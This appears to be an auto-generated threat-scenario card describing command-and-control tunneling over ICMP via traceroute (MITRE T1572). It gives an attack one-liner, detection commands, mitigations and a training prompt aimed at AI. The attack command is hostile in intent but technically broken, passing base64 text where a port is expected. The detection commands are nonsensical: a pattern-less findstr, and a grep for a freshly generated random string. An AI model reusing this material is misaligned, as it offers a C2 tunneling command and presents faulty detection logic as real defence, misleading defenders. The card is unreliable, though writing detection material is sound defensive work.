---
type: campaign
scenario_id: 398
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using traceroute to tunnel C2 commands via ICMP.

## Threat Description
Using traceroute to tunnel C2 commands via ICMP.

## Attack Command
```
traceroute -I $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -q 1 -w 1 -m 10 -p $(echo c2cmd | base64 -w0)
```

## Detection Logic
Monitor traceroute ICMP: `wmic process where name='tracert.exe' get commandline | findstr -I`; Anomalous ICMP traffic: `tshark -Y 'icmp' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.

## Mitigation
Restrict traceroute: `icacls %windir%\System32\tracert.exe /deny Everyone:RX`; Block ICMP: `netsh advfirewall firewall add rule name='Block ICMP' dir=out action=block protocol=ICMPv4`.

## AI Training Prompt
Train AI to detect ICMP-based C2 tunneling via traceroute by analyzing packet patterns, base64-encoded data, and ICMP traffic anomalies; suggest ICMP filtering.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
